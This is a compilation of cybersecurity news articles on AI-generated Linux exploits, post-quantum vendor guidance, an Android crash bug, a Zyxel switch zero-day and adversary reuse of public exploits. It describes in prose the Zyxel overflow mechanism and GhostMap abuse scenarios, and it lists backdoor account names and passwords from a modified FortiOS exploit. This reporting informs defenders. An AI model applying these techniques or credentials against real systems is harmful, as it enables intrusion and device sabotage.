articles.context: The findings build upon 24 LPE exploits that OpenAI revealed were discovered by its GPT‑5
articles.full_text:
OpenAI on Wednesday detailed a pipeline that employed an upcoming cyber-focused artificial intelligence (AI) model to validate and patch 948 local privilege escalation vulnerabilities in Linux for $1.2 million in API costs.

"Our prototype identified and analyzed 2,308 candidate Linux kernel findings, dynamically reproduced 1,724 vulnerabilities, and produced 948 local privilege escalation (LPE) exploits that could allow an unprivileged local user to gain root access," the AI company said.

The findings build upon 24 LPE exploits that OpenAI revealed were discovered by its GPT‑5.5‑Cyber model back in June 2026. The latest research turns this process into an agentic pipeline comprising five stages -

Vulnerability discovery, where agents identify high-value audit targets (i.e., parts of the codebase that are security-relevant and reachable by low-privileged users) and look for candidate findings

Dynamic validation, where agents attempt to reproduce each candidate in a sandboxed environment and preserve runtime evidence

Exploitability assessment, where agents test whether validated vulnerabilities could be abused to facilitate information disclosure or LPE and devise a proof-of-concept (PoC) exploit

Patch generation, where agents generate patches for the identified vulnerability

Human review, where security researchers review the exploit, patch, and proposed severity before it's reported to the maintainers

"In a run in mid-October 2026, our pipeline using an upcoming cyber model dynamically reproduced 1,724 vulnerabilities [within 30 hours] and generated PoCs for 291 information leak vulnerabilities and 948 working local privilege escalation (LPE) exploits for a commonly used Linux distribution," OpenAI said.

"The total run cost $1,213,430 in API credits, or $1,279 per LPE exploit. To the best of our knowledge, the agents in this pipeline discovered and used at least 10 novel Linux exploitation techniques."

At a high level, these include -

Two new persistent elastic objects to spray objects inside the target kernel cache

Two new page grooming techniques to improve exploit reliability

Five new data-only techniques to obtain privilege escalation directly or via an arbitrary write

One technique that involves arbitrary type confusion

The development is once again an indication of how frontier AI is redrawing the contours of cybersecurity, accelerating vulnerability discovery and exploitation, and at the same time helping defenders reliably address defects, albeit through additional instructions and iterations, before attackers can use them, and make it "cost prohibitive" for bad actors to exploit software.

In a report published last month, VulnCheck categorized AI-assisted vulnerability discovery as a "growing risk category" that turbocharges novice hackers, who now require little to no technical expertise to detect software vulnerabilities.

The access to AI models is not just limited to defenders, but also bad actors who can leverage the same capabilities to discover and weaponize new zero-days and expand the pool of viable targets with minimal effort.

According to insights from Google Threat Intelligence Group (GTIG), the number of vulnerabilities disclosed per month has more than doubled, rising from 5,045 in January 2026 to 10,740 in August 2026. The number of vulnerabilities classified as high-risk has surged from 131 disclosures in January 2026 to 350 in August 2026, a 167% growth.

"The widespread availability of AI-powered cyber tools has almost certainly led to a significant increase in the discovery of zero-day vulnerabilities," the U.K. National Cyber Security Centre (NCSC) said in an assessment published Tuesday.

"Defensive AI-cyber tools have reduced the window of a vulnerability moving from zero-day to an N-day vulnerability, and have made patching a quicker process. However, without correct and widespread configuring of this technology, many systems are still vulnerable to attackers using AI-cyber tools to identify and exploit system weaknesses."

The NCSC also pointed out that organizations will have to evolve their internal patching and testing processes to meet this new pace of vulnerability discovery.

"Attackers have subsequently displayed less caution over losing an access to achieve an objective, as the cost to replace is minimal," it added. "Cyber capabilities are now used for a broader range of activity due to the lower risk involved, making it easier for adversaries to access information and use it operationally."

OpenAI said the rate of vulnerability discovery by frontier models needs to be matched by automated patch generation to secure software and to limit the exploitation window.

"With human expert-guided iteration, we believe AI-generated patches can be functionally correct, aligned with existing coding styles, and robust to attack variants," OpenAI said. "For the near and medium term, having access to a low-privileged account on an operating system that isn't up-to-date on its latest available patches should be considered functionally equivalent to root access for a well-resourced threat actor."

articles.title: Post-Quantum Questions to Ask Your Vendors
articles.context: To protect their systems and data, organizations must plan for and transition to PQC—which includes algorithms capable of withstanding both classical computing and quantum-...
articles.full_text:
CISA, the Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC) and the National Security Agency (NSA) released joint guidance and an accompanying quick-reference list to help organizations assess vendor readiness for transitioning to post-quantum cryptography (PQC). As quantum computing advances, widely used public-key cryptography will become vulnerable to compromise from cryptographically relevant quantum computers (CRQCs). To protect their systems and data, organizations must plan for and transition to PQC—which includes algorithms capable of withstanding both classical computing and quantum-enabled threats—before CRQCs become available.

Many organizations rely on third-party vendors for managed services, cloud capabilities, and other cryptography-dependent products and services. Cryptography is also embedded in systems and devices that are difficult to update, tied to long asset lifecycles, and require vendor support or replacement—such as industrial control systems and Internet of Things (IoT) devices. Reliance on vendors means that effective PQC transition depends on vendor readiness, and early, structured engagement with these vendors is critical to planning efforts.

Organizations can use the vendor-neutral questions outlined in this guidance to determine whether a vendor understands quantum-related risks, maintains transparency over its cryptographic implementations, and supports a secure, cost-effective and timely transition to PQC.

Visit CISA’s PQC Initiative page for additional resources.

articles.title: GhostMap Bug Leaves Android Phones Stuck in Reboot Loop
articles.context: Security experts have warned of a new vulnerability in Android smartphones which could plunge devices into a crash loop that can only be fixed by forcing a factory reset
articles.full_text:
Security experts have warned of a new vulnerability in Android smartphones which could plunge devices into a crash loop that can only be fixed by forcing a factory reset.

Bitdefender said it discovered the issue when an Android package (APK) it collected from the wild crashed the emulators in its labs. It found that the problem wasn’t malware, but a bug in the Android OS itself.

“The operating system mishandles two fields inside a ZIP entry, the compression method and the declared uncompressed length. Reading such an entry causes a SIGBUS (a signal sent by the CPU to stop a process that accesses an invalid memory space) in whichever process touches the file,” it explained in a blog post.

“We call it GhostMap: the malformed entry causes Android to map the file across memory that was never allocated, and the crash occurs when a process reads from that empty space.”

Read more on Android bugs: Google API Keys Quietly Gain Access to Gemini on Android Devices.

Bitdefender said that the crash loop persists after a reboot and continues in safe mode, meaning the only way out is a factory reset which erases all locally stored data.

The bug affects all Android versions from Android 10 and above, but Google has so far failed to address it, claiming the issue is outside the scope of a security fix, the report noted.

It was notified by the security vendor on August 20.

How Threat Actors Could Abuse GhostMap

Bitdefender warned that cybercriminals could theoretically hide the technique in a fake app to disable a victim’s phone, or use the threat of GhostMap as leverage for extortion.

It shared several possible scenarios:

Brick a victim’s phone by first creating a malicious app containing a deliberately malformed resource that Android’s system service needs to read. When it does, the resource triggers a crash in system_server which renders the phone unusable. This could be used for extortion

Make a malicious app impossible to remove. In this scenario an icon contains a malformed resource which triggers a crash when Android tries to display it. The launcher, the app list in Settings, and the app's own info screen all crash when the user tries to access them to uninstall

Disable security tools. Mobile security apps, malware-analysis sandboxes and automated scanning pipelines need to use Android's resource-parsing code to examine suspect apps. By embedding a malformed resource in an APK, hackers could trigger GhostMap to crash anything inspecting it

Delivery through an app update. An app looks trusted on download but, in theory, the malformed file could be introduced later. That would mean it could pass app-store checks and security scans to infect a much larger number of potential victims at once

“This is a flaw in Android itself and, as of publication, no fix is available, so users have limited options on the device to prevent it. The most practical defense is to recognize the file before the bug is triggered,” Bitdefender concluded.

“That's possible because the malformation is visible in the file's structure, without installing or running the app. A scanner can distinguish a crafted file from a normal one by inspecting it, not by executing it.”

The vendor detects this issue as Android.Riskware.Ghostmap.rA.

articles.title: Zyxel patches a zero-day hiding behind an old fix
articles.context: Zyxel has patched a zero-day vulnerability that attackers exploited to compromise 996 GS1900 network switches across 48 countries, exposing device configurations, network...
articles.full_text:
Zyxel has patched a zero-day vulnerability that attackers exploited to compromise 996 GS1900 network switches across 48 countries, exposing device configurations, network information and hashed root credentials. The attack began around August 17, according to cybersecurity firm GreyNoise, but researchers initially blamed a different vulnerability that Zyxel had already addressed.

The newly identified flaw, tracked as CVE-2026-107441, is a CVSS 8.8 out-of-bounds write vulnerability in the switches’ web management interface. It allows unauthenticated attackers with network access to execute operating system commands through specially crafted HTTP requests.

The flaw affects ten GS1900 models, including GS1900-8, GS1900-24, and GS1900-48. Zyxel listed firmware versions ending in .2C0 and earlier as vulnerable, with model-specific fixes in versions ending in .3C0.

Zyxel released a fix for CVE-2026-7273 in June, addressing a separate buffer overflow in the same switch series. GreyNoise initially attributed the attacks to that vulnerability, prompting CISA to add it to its Known Exploited Vulnerabilities catalog in September.

However, security researchers at Binary discovered an exploit targeting a previously unknown flaw that remained effective even on switches running the June updates. The researchers reported the vulnerability to Zyxel on September 29.

The attackers used a script to collect device configurations, hashed root credentials, and network information. Such data can give intruders a useful map of an organization’s network and potentially help them move deeper into its infrastructure. Zyxel released firmware updates on October 22 and published its advisory on November 3. Administrators should update affected GS1900 switches, including those already running June security fixes.

articles.title: Zyxel GS1900 Patch Fails to Block Zero-Day Exploit Allowing Root Command Execution
articles.context: Zyxel GS1900 network switches that received the vendor's earlier fix for an actively exploited flaw are still open to the exploit attackers used, researchers at Binarly found
articles.full_text:
Zyxel GS1900 network switches that received the vendor's earlier fix for an actively exploited flaw are still open to the exploit attackers used, researchers at Binarly found.

The exploit lets anyone who can reach a switch's web management interface run commands on it without logging in. Zyxel has released new firmware for 10 GS1900 models that closes the hole.

The earlier fix is the 2.90 Patch 2 firmware, named in a June 16 advisory for a flaw tracked as CVE-2026-7273. The new 2.90 Patch 3 firmware fixes a flaw now tracked separately as CVE-2026-107441, which the exploit relies on. It was posted on October 23, and the vendor announced it in an advisory earlier this week.

The researchers, who reported the flaw to the vendor on September 29, call it a zero-day. Attackers already had a working exploit for it by then.

GreyNoise, which monitors attack traffic through a network of sensors, reported on September 21 that attackers took data from 996 GS1900 switches around August 17. It tied the attacks to CVE-2026-7273, and the researchers say the exploit it described matches the one they found.

Neither GreyNoise nor Binarly says the attacked switches were running the earlier fix, and the vendor's advisory does not say whether the new flaw has been exploited.

Which Switches Need the New Firmware

Zyxel's security advisory lists the affected and fixed firmware for each model:

Model

Affected firmware

Fixed firmware

GS1900-8

2.90(AAHH.2)C0 and earlier

2.90(AAHH.3)C0

GS1900-8HP

2.90(AAHI.2)C0 and earlier

2.90(AAHI.3)C0

GS1900-10HP

2.90(AAZI.2)C0 and earlier

2.90(AAZI.3)C0

GS1900-16

2.90(AAHJ.2)C0 and earlier

2.90(AAHJ.3)C0

GS1900-24

2.90(AAHL.2)C0 and earlier

2.90(AAHL.3)C0

GS1900-24E

2.90(AAHK.2)C0 and earlier

2.90(AAHK.3)C0

GS1900-24EP

2.90(ABTO.2)C0 and earlier

2.90(ABTO.3)C0

GS1900-24HPv2

2.90(ABTP.2)C0 and earlier

2.90(ABTP.3)C0

GS1900-48

2.90(AAHN.2)C0 and earlier

2.90(AAHN.3)C0

GS1900-48HPv2

2.90(ABTQ.2)C0 and earlier

2.90(ABTQ.3)C0

Switches on Patch 2 or any earlier firmware need the Patch 3 build for their model. The builds are posted with their firmware release notes.

The advisory lists no workaround for owners who cannot update yet. It also does not say whether updating removes access an attacker may already have, or what owners should check if a switch may have been compromised.

The U.S. Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2026-7273 to its Known Exploited Vulnerabilities (KEV) catalog on September 21 and gave federal agencies until September 24 to apply the vendor's fix, the Patch 2 firmware. The listing came the day the earlier attacks were made public.

The researchers' vulnerability advisory says the new flaw is present in all 10 of those Patch 2 builds. It also says "an attacker only needs network reachability to the management service", while the vendor's advisory describes a "LAN-based, unauthenticated attacker".

The researchers rate the flaw 9.8 out of 10 on the CVSS severity scale, against 8.8 in the vendor's CVE entry, and say the attacker's commands run with root privileges.

Why the Earlier Fix Did Not Stop the Exploit

Binarly's technical analysis traces the flaw to the program that handles web requests on the switch. It is an out-of-bounds write, meaning the program writes data beyond the memory allocated for it.

The program stores each request parameter in a fixed area that can accommodate 140 parameters. It never checked the size of a parameter, and before Patch 2 it never checked how many parameters it had stored.

The exploit sends a 140th parameter that is too large, causing it to overrun the end of that area and overwrite the program's parameter counter. The next parameter is then written outside the area, allowing the attacker to swap the function the program is about to call for one that runs the attacker's command.

Patch 2 added a check on the counter, but the check runs only after the oversized parameter has been copied. By then the counter holds the attacker's value, so the check does not stop the write. The researchers say the exploit works against Patch 2 without changes.

They tested it on emulated firmware and on real hardware, though they do not say which model. The exploit's own list of supported firmware includes the Patch 2 build for the GS1900-24.

According to the researchers, Zyxel told them that CVE-2026-7273 was about the missing counter check, and that it treats the missing size check as a separate flaw, now CVE-2026-107441.

In the Patch 3 code, the counter is checked before a parameter is copied, and the copy is limited in size. The researchers say this fixes the flaw.

What Is Known About the Attacks

GreyNoise's attack report says the attackers used the exploit to download a data-collection script onto the switches and left the collected data to be picked up. The data included switch configurations, hashed root credentials, and network information. Of the 996 switches, 564 still used factory-default credentials.

The report does not say which firmware the switches were running or how the attackers reached them. It says the attackers are the same as, or related to, a group that Acronis tracks as Red Heron and describes as Chinese-speaking. Acronis linked a backdoor called JITTERLY to Red Heron in an earlier campaign that targeted Gitea servers.

The researchers found the exploit on September 17 in an open folder on a server that also acted as a command server for JITTERLY.

Their advisory offers two explanations. Either the Patch 2 update was a faulty fix for CVE-2026-7273, or the attacks exploited a different flaw from the one CISA listed.

The researchers say they will soon publish a smaller version of the exploit as a proof of concept. CISA's KEV catalog data, last updated yesterday, does not list CVE-2026-107441.

articles.title: How Adversaries Are Turning the Vulnerability Ecosystem Against Defenders
articles.context: Among them was a modified version (SHA256 hash: fd6b46d148af22da6163f18ce43b35ebb827cc6e140f03f0f514bc2a6f548743) of a public POC exploit for a FortiOS and FortiProxy...
articles.full_text:
Fortinet FortiOS and FortiProxy Authentication Bypass Vulnerability (CVE-2024-55591)

In February 2026, CrowdStrike Counter Adversary Operations identified an open directory controlled by the Iran-nexus adversary STATIC KITTEN on IP address 157.20.182[.]49 containing 1.9 GB of data and more than 20,000 files. Among them was a modified version (SHA256 hash: fd6b46d148af22da6163f18ce43b35ebb827cc6e140f03f0f514bc2a6f548743) of a public POC exploit for a FortiOS and FortiProxy authentication bypass vulnerability (CVE-2024-55591) first released by a well-known industry source on January 27, 2025.4

Where the public POC exploit executed a single user-provided command, the modified version contained 13 hardcoded payloads designed to enumerate targets, create users, and establish persistence. The modifications reflect a systematic approach to turning a demonstration tool into a more comprehensive exploit.

Table 1. Payloads for modified CVE-2024-55591 exploit

Payload Name

Description

test

Creates the backdoor admin user FortiWiFi with password FortiWiFi123 and assigns this user the super_admin profile, granting full system access

test2

Lists all user groups in the victim system, likely to facilitate reconnaissance in order to understand the victim system’s existing group structure

test3

Displays all local user accounts, allowing the attacker to enumerate existing users

test4

Modifies the FortiWiFi admin account by assigning it the ssl-vpn-groupamoss access profile

test5

Creates the FortiWiFi user with password FortiWiFi123, adds this user to the ssl-vpn-groupamoss group, and then displays all user groups to verify the user was successfully added to the group

test6

Creates or modifies a user group named ssl-vpa-amoss and adds multiple users to this group, including the backdoor FortiWiFi account (created by test1 or test5) and users with transliterated Hebrew-language names (i.e., shachar, sigal, amos, sima, lev, and gabi)

test7

Queries the ssl-vpn-groupamoss group configuration’s help information, likely to understand available options for follow-on activities

test8

Creates the backdoor user darlen with password 1234

test9

Similar to the test payload, creates the FortiWiFi user with password FortiWiFi123 or updates the existing FortiWiFi user to use that password

test10

Creates the FortiWiFi user with password 1234 and adds this user (along with numerous other users, many with transliterated Hebrew-language names) to the VPN-Users group, potentially to hide the backdoor account among legitimate users

test11

Creates a system admin account named FortiSetup with super_admin privileges and an encrypted password (decrypted password is gwm1607pmw); this account provides a more sophisticated backdoor than those created by other payloads, as FortiSetup has root VDOM access

test12

Displays the FortiAdmin account’s configuration, likely to facilitate reconnaissance

test13

Creates a user named offices with an email address and an encrypted password (decrypted password is @lolo@123456); POC_ZZ_1.py‘s developer may have added this email address to make the new user appear legitimate

Whether STATIC KITTEN modified the public CVE-2024-55591 exploit themselves or obtained this modified version from another source remains unknown. However, as of this writing, CrowdStrike Counter Adversary Operations has not observed any other adversaries using this modified POC or infrastructure hosting it.

AI’s Impact on the Vulnerability Research Ecosystem

AI advancements are undoubtedly accelerating the speed and scope of how vulnerabilities are discovered and weaponized.5 One only has to look at the substantial increase in the number of vulnerabilities in recent Microsoft Patch Tuesdays compared to prior to the advent of frontier models earlier this year.6

Detecting and attributing adversaries’ direct use of AI for vulnerability research purposes remains hard to identify due to inherent visibility gaps and the fact there is no single identifier that distinguishes AI-generated exploit code. Complicating things further, is that the patterns suggesting AI assistance (such as well-commented code, improvements to existing POCs, or structured code organization) are also consistent with the output of someone with high technical capabilities.

Nonetheless, threat actors are leveraging AI to augment their vulnerability research. CrowdStrike Intelligence assesses they will almost certainly continue to do so through at least three vectors:

Direct interaction with frontier models by trying to “jailbreak” AI safeguards and bypass any export control restrictions

Modifying open-weight proprietary models for malicious use by extracting safeguards; these are not/less monitored for abuse by frontier AI companies

Adopting AI-led/assisted public vulnerability research published by industry sources

The third point, while not a direct use, is the easiest to detect. One only has to look at the CopyFail vulnerability detailed in this blog post, whose discovery was allegedly facilitated by AI.7 Or the mass exploitation of wp2shell in July 2026, which is the first critical unauthenticated WordPress Core remote code execution (RCE) purportedly discovered in nearly a decade and was allegedly discovered using GPT5.6 Sol Ultra and $25 USD worth of tokens.8

Outlook

Adversaries will almost certainly continue using public vulnerability research as part of their offensive toolkit through the foreseeable future. As more POC exploits become routinely available within hours of disclosure, at least partially driven by AI-assisted vulnerability research, the number of threat actors using them will almost certainly increase. Over the next year, this will likely manifest itself in the rise of widespread exploitation campaigns resulting in contested environments, like the cPanel CVE-2026-41940 exploitation example covered in this blog post.

This expanding pool of adversaries leveraging public vulnerability research, combined with the rapid speed at which adversaries are operationalizing public research, reinforces three key points.

The first is that patch prioritization is harder than ever. As vulnerability disclosures continue to increase in volume, predicting which ones will attract public research (and therefore adversary attention) becomes a genuine intelligence challenge. Because adversaries have access to the same advisories and public exploits that defenders do, organizations that rely solely on CVSS scores to drive patching decisions are relying on the wrong signal. Real-world exploitability, ease of exploitation (i.e., if there is a public exploit or exploitation guidance), and adversary intent are what separate the vulnerabilities that matter from the ones that do not.

The second is that the time to patch is effectively zero. The data from the first half of 2026 shows this: 91% of vulnerabilities with POCs that CrowdStrike has seen exploited were weaponized and used in the wild within 48 hours, with the fastest observation occurring just 35 minutes after a POC became available. Adversaries treat public vulnerability research as the starting gun, and legacy patch cycles measured in weeks or days cannot compete.

Lastly, more threat actors can participate in exploitation. As the case studies show, adversaries across skill and resource levels are operationalizing public research, some using POCs with minimal modification and others refining them (as UMBRAL BISON and STATIC KITTEN both demonstrated). When motivation and intent are the only remaining barriers to exploitation, the volume of participating adversaries significantly increases.

The vulnerability research ecosystem is one of the security community's greatest assets and most significant challenges. Defenders who treat public research as a threat actor's green light, and who build the intelligence, patching timelines, and detection capabilities to match, are the ones who will keep pace.

Jaime Duque and Lacie Blythe are Senior Intelligence Analysts at CrowdStrike. This research was presented at Day Zero 2026.
